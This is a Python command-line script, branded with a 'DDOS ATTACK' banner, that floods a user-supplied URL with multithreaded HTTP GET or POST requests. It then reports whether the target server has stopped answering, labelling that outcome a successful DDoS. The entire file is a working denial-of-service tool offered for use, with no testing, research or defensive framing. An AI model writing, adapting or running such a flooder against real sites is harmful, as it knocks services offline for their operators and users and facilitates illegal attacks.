import requests
import colorama
import os
import threading
import time

green = colorama.Fore.GREEN
red = colorama.Fore.RED
magenta = colorama.Fore.MAGENTA

os.system("cls" if os.name == "nt" else "clear")
print(magenta + """
____  ____   ___  ____       _  _____ _____  _    ____ _  __
|  _ \|  _ \ / _ \/ ___|     / \|_   _|_   _|/ \  / ___| |/ /
| | | | | | | | | \___ \    / _ \ | |   | | / _ \| |   | ' / 
| |_| | |_| | |_| |___) |  / ___ \| |   | |/ ___ \ |___| . \ 
|____/|____/ \___/|____/  /_/   \_\_|   |_/_/   \_\____|_|\_\
""")

url = input(green + "Enter the URL to attack: ")
method = input(green + "Enter the HTTP method (GET/POST/FETCH): ").upper()
total_requests = int(input(green + "Enter the total number of requests to send: "))
num_threads = int(input(green + "Enter the number of threads to use or send 999 to select all threads: "))
input(green + "Are you sure you want to attack this URL? (Press Enter to continue)")
os.system("cls" if os.name == "nt" else "clear")
if num_threads >= os.cpu_count():
    num_threads = os.cpu_count()
if num_threads >= total_requests:
    print(red + "You have selected more threads than total requests.")

def send_requests(requests_per_thread, thread_id):
    for i in range(requests_per_thread):
        try:
            if method == "GET":
                response = requests.get(url)
            elif method == "POST":
                response = requests.post(url)
            elif method == "FETCH":
                response = requests.get(url)
            else:
                print(green + "Invalid method. Please use GET, POST, or FETCH.")
                return
            print(green + f"[Thread {thread_id}] Request {i+1}: {response.status_code}")
        except Exception as e:
            print(red + f"[Thread {thread_id}] Error: {e}")
            return

threads = []
requests_per_thread = total_requests // num_threads

start_time = time.time()

for thread_id in range(num_threads):
    t = threading.Thread(target=send_requests, args=(requests_per_thread, thread_id))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

end_time = time.time()

try:
    response = requests.get(url, timeout=5)
    if response.status_code == 200:
        print(red + "Server answered, DDoS attack is not working.")
    else:
        print(red + f"Server answered with error code {response.status_code}.")
except requests.exceptions.RequestException as e:
    print(green + f"Simulated DDoS successful: server error - {e}")

elapsed_time = end_time - start_time
print(green + f"Total attack duration: {elapsed_time:.2f} seconds.")